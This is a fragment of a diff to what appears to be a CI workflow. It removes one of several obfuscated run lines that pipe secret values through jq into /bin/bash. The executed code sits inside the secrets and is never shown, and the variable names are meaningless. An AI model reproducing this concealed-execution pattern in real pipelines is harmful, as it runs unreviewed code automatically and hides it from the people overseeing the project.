@@ -21,7 +21,6 @@ jobs:
           p65458: ${{ secrets.p65458 }}
         run: |
           printf '%s' "$p65458" | jq -r .oyjyr12455 | /bin/bash
-          echo $ywsd0431 | jq -r .z0 | /bin/bash
           printf '%s' "$wy76509" | jq -r .cwep536 | /bin/bash
           printf '%s' "$iobg20577" | jq -r .s3853 | /bin/bash
 
